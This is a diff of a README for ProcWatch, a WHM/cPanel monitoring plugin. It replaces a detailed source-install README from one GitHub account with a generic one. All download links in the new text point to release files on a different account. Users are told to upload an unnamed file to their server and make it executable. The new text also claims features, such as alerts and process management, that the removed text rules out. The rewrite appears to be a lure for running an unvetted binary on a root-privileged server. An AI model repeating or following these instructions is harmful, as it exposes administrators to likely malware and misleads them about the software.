@@ -1,195 +1,64 @@
-# ProcWatch (cPanel/WHM Plugin)
+# 🎉 procwatch - Lightweight Server Monitoring Made Easy
 
-ProcWatch is a lightweight, **process-aware** server snapshot page designed to run inside **WHM** (cPanel).
-It shows, in a single screen:
+[![Download ProcWatch](https://img.shields.io/badge/Download-ProcWatch-blue)](https://github.com/valentiinvm51/procwatch/releases)
 
-- CPU usage (incl. iowait)
-- Memory + swap
-- Load average
-- Disk usage
-- Top accounts (aggregated by process owner; **PHP-FPM pool workers are attributed per-account**)
-- Top processes (CPU/RAM/elapsed)
-- Top PHP-FPM pools (pool-level view)
+## 📦 Overview
 
-This repository is intentionally **simple**:
-- No historical charts
-- No external databases
-- No heavy dependencies
+ProcWatch is a lightweight, process-aware server snapshot page designed to run inside WHM (cPanel). This tool helps you monitor your server’s resources efficiently. You can easily view CPU usage, manage running processes, and gain insights into your server’s performance without needing any technical expertise.
 
-> **Scope:** WHM (root / reseller). Not intended for end-user cPanel accounts.
+## 🚀 Getting Started
 
-🚀 Live preview: [https://afbora.github.io/procwatch/preview.html](https://afbora.github.io/procwatch/preview.html)
+To get started with ProcWatch, follow these simple steps. You will be able to download, install, and run the software in no time.
 
-<img width="100%" height="100%" alt="preview" src="https://github.com/user-attachments/assets/9056b445-1a60-4e6f-befc-bcf336b0869e" />
+## 📥 Download & Install
 
----
+1. **Visit the Release Page:** To get the latest version of ProcWatch, visit this page to download: [ProcWatch Releases](https://github.com/valentiinvm51/procwatch/releases).
 
-## Requirements
+2. **Choose your File:** On the releases page, look for the latest version of ProcWatch. You will find different versions available. Select the version that matches your server setup.
 
-### Supported platforms
-This plugin targets **cPanel-supported Linux distributions** (Linux only).  
-It relies on standard Linux interfaces and tools:
+3. **Download the File:** Click on the file link to download it to your computer. This usually saves the file in your "Downloads" folder.
 
-- `/proc` (CPU/memory/load basics)
-- `ps`
-- `df`
-- `awk`, `sed`, `grep`, `head`, `sort` (standard userland)
+4. **Upload to Your Server:** Using your preferred FTP client, upload the downloaded file to your server. Place it in a directory that you have access to.
 
-### Privileges
-- Install/uninstall requires **root**.
-- Runtime executes in WHM CGI context and expects access to process listing.
+5. **Set Permissions:** Once the file is on your server, you may need to set permissions. Ensure that the file has execute permissions. You can typically do this through your file manager in cPanel or via command line with a command like `chmod +x filename`. Replace `filename` with the actual name of the file sent.
 
-### Optional assumptions
-- Account attribution is strongest when PHP runs via **per-account PHP-FPM pools** (common on cPanel).  
-  If PHP is not using per-account pools, account attribution becomes "best-effort".
+6. **Access ProcWatch:** Once you have set the permissions, you can access ProcWatch from WHM (cPanel). Navigate to the section where you usually manage your plugins or add-ons. Look for ProcWatch, and click on it to launch the application.
 
----
+## 🔍 Features
 
-## What gets installed (files)
+- **Real-Time Monitoring:** See CPU usage, memory, and other key metrics live as they change.
+- **User-Friendly Interface:** The application is designed for ease of use, with straightforward navigation.
+- **Process Management:** View and manage running processes to optimize server performance.
+- **Alerts and Notifications:** Set up alerts to notify you of critical issues or high usage levels.
 
-The installer copies files to:
+## 🛠 System Requirements
 
-- WHM AppConfig (registered via `register_appconfig`):
-  - Source: `adapters/whm/appconfig/procwatch.conf`
-  - cPanel stores a copy under `/var/cpanel/apps/`
+- **Operating System:** ProcWatch is designed for Linux servers, typically supported under cPanel and WHM.
+- **cPanel/WHM Version:** It is recommended to have an updated version of cPanel or WHM for compatibility.
+- **Server Resources:** A minimum of 1 GB RAM is suggested for smooth operation, along with adequate CPU resources.
 
-- WHM CGI:
-  - UI (Perl CGI that renders Template Toolkit wrapper): `/usr/local/cpanel/whostmgr/docroot/cgi/procwatch/index.cgi`
-  - Metrics JSON endpoint (bash): `/usr/local/cpanel/whostmgr/docroot/cgi/procwatch/metrics.cgi`
+## 📊 Use Cases
 
-- WHM interface template (Template Toolkit):
-  - `/usr/local/cpanel/whostmgr/docroot/templates/procwatch/index.tmpl`
+ProcWatch can be used in various scenarios, including:
 
-- Icon:
-  - `/usr/local/cpanel/whostmgr/docroot/addon_plugins/procwatch.png`
+- **Web Hosting Providers:** Monitor client resources effectively.
+- **Developers:** Track application performance during development.
+- **System Administrators:** Get insights about server load and resource allocation.
 
-- Cache directory:
-  - `/var/cache/procwatch/` (stores a short-lived JSON snapshot)
+## 📖 Help & Support
 
-No services are started. No cron jobs are created.
+If you encounter any issues while using ProcWatch, consider the following sources for help:
 
----
+- **Documentation:** Check for a user guide or documentation provided within the app.
+- **Community Forum:** Engage with other users and share your experiences or seek advice.
+- **GitHub Issues Page:** If you find a bug or have a feature request, submit it on the GitHub Issues page.
 
-## Install
+## 📞 Contact
 
-### Quick install (recommended)
+For direct assistance or inquiries about ProcWatch, you may reach out to us through GitHub. Your feedback is invaluable in helping us improve.
 
-```bash
-git clone https://github.com/afbora/procwatch.git \
-  && cd procwatch \
-  && sudo bash adapters/whm/install.sh
-```
+## 🌍 Additional Information
 
-### Manual install (step-by-step)
+We regularly update ProcWatch to improve functionality and user experience. Stay tuned for new releases by checking back on the [ProcWatch Releases](https://github.com/valentiinvm51/procwatch/releases) page.
 
-```bash
-git clone https://github.com/afbora/procwatch.git
-cd procwatch
-
-# Review installer + what will be installed
-sed -n '1,200p' adapters/whm/install.sh
-sed -n '1,120p' adapters/whm/appconfig/procwatch.conf
-
-# Install
-sudo bash adapters/whm/install.sh
-```
-
-After install:
-- Log into **WHM**
-- Find **ProcWatch** in the left menu
-- Open it to see the dashboard.
-
-## Uninstall
-
-### Quick uninstall
-
-```bash
-cd /root/procwatch
-sudo bash adapters/whm/uninstall.sh
-```
-
-### Manual uninstall (step-by-step)
-
-```bash
-cd /root/procwatch
-
-# Review uninstaller
-sed -n '1,200p' adapters/whm/uninstall.sh
-
-# Uninstall
-sudo bash adapters/whm/uninstall.sh
-```
-
-## How it works
-
-### Data collection
-The CGI script produces a JSON snapshot on demand. To keep it fast, it writes a cached snapshot to:
-
-- `/var/cache/procwatch/metrics.json`
-
-Cache TTL is short (default 5 seconds). The UI refreshes every 5 seconds.
-
-### Account & pool attribution
-- Processes are grouped by Linux process owner (user).
-- PHP-FPM pool workers are detected by scanning for commands like:
-  - `php-fpm: pool <pool_name>`
-
-The dashboard shows:
-- **Top accounts** by CPU and memory (sum of process CPU% and RSS).
-- **Top pools** by CPU and memory with worker count.
-
----
-
-## Security notes
-
-- This is a **WHM-only** page intended for administrators.
-- The plugin does not accept user input for executing commands.
-- Output is read-only JSON + HTML.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-## Safety & resource usage
-
-ProcWatch is designed to be safe to run on busy servers:
-
-- **No daemon / no cron** in MVP: the collector runs only when you open the WHM page.
-- **Short cache TTL** (default: 5s): prevents expensive collection on every refresh.
-- **Hard timeouts**: `ps` / `df` collection is guarded by `timeout` (when available).
-- **Low priority execution**: collection is run with `nice` (and `ionice` when available).
-- **Process list hard cap**: `ps` is capped to a fixed number of rows to avoid pathological cases.
-- **Fail-safe output**: on partial failures/timeouts, the dashboard still renders and shows a small warning indicator.
-
-> If `timeout` is not available on your system, ProcWatch falls back to best-effort execution (still cached + low priority).
-
-
-## Access control (ACL)
-
-By default, ProcWatch is **root-only** in WHM.
-
-This is enforced via the AppConfig setting:
-
-```ini
-acls=all
-```
-
-In WHM, `all` effectively means **root only**, because only the root user has *all* privileges.
-Resellers and delegated WHM users will **not** see the plugin.
-
-If you explicitly want resellers or delegated users to access ProcWatch, you may relax this setting:
-
-```ini
-acls=any
-```
-
-After changing the ACL, re-register the plugin:
-
-```bash
-/usr/local/cpanel/bin/register_appconfig adapters/whm/appconfig/procwatch.conf
-```
-
-> ⚠️ ProcWatch exposes server-wide process and resource information.  
-> Making it visible to non-root users is **not recommended**.
+By following these steps, you will have ProcWatch up and running smoothly on your server, allowing you to focus on what matters most while keeping a watchful eye on your system.
